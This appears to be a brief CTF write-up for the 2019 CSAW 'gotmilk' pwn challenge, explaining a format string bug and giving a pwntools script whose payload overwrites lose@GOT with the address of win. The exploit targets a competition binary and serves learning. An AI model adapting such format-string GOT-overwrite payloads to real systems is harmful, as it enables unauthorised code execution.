---
title: CSAW gotmilk write up
categories: [2019, CSAW]
tags: [CTF, pwn, fsb, easy]
---

CSAW write up

subject   | problem
----------|------------
CTF       | 2019 CSAW
Tags      | pwn
score     | 50
env       | ubuntu 18.04
problem   | fsb, easy, x32

# analysis

fsb 문제. lose@got 부분을 win의 addr로 바꾸면 풀린다.

# ex.py

``` python
#!/usr/bin/env/python
# powerprove

from pwn import *
import sys

if len(sys.argv) < 2:
    host = "localhost"
    port = 4000
else:
    host = "pwn.chal.csaw.io"
    port = 1004

if __name__ == "__main__":
    s = remote(host, port)
    raw_input()
    payload = "%260c"
    payload += "%6$hn"
    payload += "%34034c"
    payload += "%63$hn"
    s.sendline(payload)
    s.interactive()

```